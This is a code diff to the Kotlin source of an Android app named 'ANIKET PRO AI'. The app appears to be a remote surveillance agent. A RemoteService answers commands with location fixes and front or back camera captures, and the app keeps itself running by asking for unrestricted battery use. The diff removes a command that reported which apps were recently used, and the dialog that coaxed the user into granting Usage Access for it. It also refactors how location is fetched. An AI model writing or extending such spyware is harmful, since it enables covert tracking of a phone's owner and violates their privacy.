@@ -5,14 +5,12 @@ import android.accounts.AccountManager
 import android.app.Activity
 import android.app.AlarmManager
 import android.app.AlertDialog
-import android.app.AppOpsManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.RecoverableSecurityException
 import android.app.Service
-import android.app.usage.UsageStatsManager
 import android.content.BroadcastReceiver
 import android.content.ContentUris
 import android.content.Context
@@ -41,7 +39,6 @@ import android.os.HandlerThread
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
-import android.os.Process
 import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -222,7 +219,9 @@ fun locFresh(ctx: Context): JSONObject {
             override fun onProviderDisabled(p: String) {}
         }
         for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
-            try { lm.requestLocationUpdates(prov, 0L, 0f, listener, ht.looper) } catch (_: Exception) { }
+            try {
+                lm.requestLocationUpdates(prov, 0L, 0f, listener, ht.looper)
+            } catch (_: Exception) { }
         }
         latch.await(9, TimeUnit.SECONDS)
         try { lm.removeUpdates(listener) } catch (_: Exception) { }
@@ -508,23 +507,6 @@ class RemoteService : Service() {
                     }
                     r.put("ok", true); r.put("data", arr)
                 }
-                "apps" -> {
-                    val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
-                    val end = System.currentTimeMillis()
-                    val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, end - 24 * 3600 * 1000, end)
-                    if (stats == null || stats.isEmpty()) {
-                        r.put("ok", false); r.put("err", "usage_access_off"); return r
-                    }
-                    stats.sortByDescending { it.lastTimeUsed }
-                    val arr = JSONArray()
-                    for (s in stats.take(15)) {
-                        val o = JSONObject()
-                        o.put("pkg", s.packageName)
-                        o.put("last", s.lastTimeUsed)
-                        arr.put(o)
-                    }
-                    r.put("ok", true); r.put("data", arr)
-                }
                 "camfront", "camback" -> {
                     if (!permGranted(this, Manifest.permission.CAMERA)) {
                         r.put("ok", false); r.put("err", "no_perm"); return r
@@ -799,16 +781,6 @@ class MainActivity : FlutterActivity() {
     private var pendingDeleteResult: MethodChannel.Result? = null
     private var player: MediaPlayer? = null
 
-    private fun hasUsageAccess(): Boolean {
-        return try {
-            val am = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
-            val mode = am.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
-            mode == AppOpsManager.MODE_ALLOWED
-        } catch (_: Exception) {
-            false
-        }
-    }
-
     private fun promptBatteryUnrestricted() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -830,36 +802,11 @@ class MainActivity : FlutterActivity() {
         } catch (_: Exception) { }
     }
 
-    private fun promptUsageAccess() {
-        try {
-            if (hasUsageAccess()) return
-            AlertDialog.Builder(this)
-                .setTitle("Recent apps access")
-                .setMessage("To see which apps were used on this phone, enable Usage Access. Tap Allow, then find ANIKET PRO AI in the list and turn it ON.")
-                .setPositiveButton("Allow") { d, _ ->
-                    d.dismiss()
-                    try {
-                        startActivity(
-                            Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:$packageName"))
-                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        )
-                    } catch (_: Exception) {
-                        try {
-                            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-                        } catch (_: Exception) { }
-                    }
-                }
-                .setNegativeButton("Later") { d, _ -> d.dismiss() }
-                .show()
-        } catch (_: Exception) { }
-    }
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
         startAgentIfReady(this)
         promptBatteryUnrestricted()
-        promptUsageAccess()
     }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
@@ -998,31 +945,8 @@ class MainActivity : FlutterActivity() {
                             if (last != null && System.currentTimeMillis() - last.time < 120000) {
                                 result.success(locMap(last))
                             } else {
-                                val done = booleanArrayOf(false)
-                                val listener = object : android.location.LocationListener {
-                                    override fun onLocationChanged(l: android.location.Location) {
-                                        if (!done[0]) {
-                                            done[0] = true
-                                            try { lm.removeUpdates(this) } catch (_: Exception) { }
-                                            result.success(locMap(l))
-                                        }
-                                    }
-                                    @Deprecated("deprecated")
-                                    override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
-                                    override fun onProviderEnabled(p: String) {}
-                                    override fun onProviderDisabled(p: String) {}
-                                }
-                                for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
-                                    try { lm.requestLocationUpdates(prov, 0L, 0f, listener) } catch (_: Exception) { }
-                                }
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    if (!done[0]) {
-                                        done[0] = true
-                                        try { lm.removeUpdates(listener) } catch (_: Exception) { }
-                                        val l2 = bestLast(lm)
-                                        if (l2 != null) result.success(locMap(l2)) else result.success(null)
-                                    }
-                                }, 8000)
+                                val j = locFresh(this)
+                                result.success(j.toString())
                             }
                         }
                     }
